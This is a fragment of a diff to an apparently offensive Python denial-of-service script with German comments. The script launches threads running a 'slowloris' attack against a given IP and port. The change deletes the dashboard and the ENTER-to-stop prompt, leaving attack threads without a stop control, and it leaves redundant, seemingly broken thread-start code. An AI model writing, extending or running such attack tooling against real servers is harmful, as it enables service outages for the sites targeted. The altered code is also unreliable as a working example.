@@ -164,14 +164,7 @@ if __name__ == "__main__":
             ]
             for thread in attack_threads:
                 thread.start()
-
-            # Dashboard starten
-            dashboard_thread = threading.Thread(target=dashboard)
-            dashboard_thread.start()
-
-            input("\n[INFO] Drücke ENTER, um den Angriff zu stoppen.\n")
-            stop_event.set()
-
+                
             # Threads starten
             attack_threads = [
                 threading.Thread(target=slowloris, args=(ip, port))
